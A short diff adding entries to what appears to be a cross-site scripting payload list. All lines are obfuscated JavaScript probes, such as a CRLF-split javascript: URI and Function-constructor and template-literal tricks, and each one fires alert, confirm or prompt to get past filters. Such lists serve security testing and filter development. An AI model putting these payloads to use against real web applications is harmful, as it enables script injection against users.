@@ -248,3 +248,7 @@ prompt`${document.domain}`
 javascr%0d%0aipt%3Aalert.call(this,%20document.domain)
 alert(1)('lol','lol')('lol','lol')('lol','lol')('lol','lol').x.y.LOL()
 javascript:confirm(7)//://svg
+Function("a=`","`,xss=1){alert(xss)")()
+a=`${alert/*}`;
+b=`*/(1)}`;
+Function("a=`","`,xss=1){alert(xss)")() 
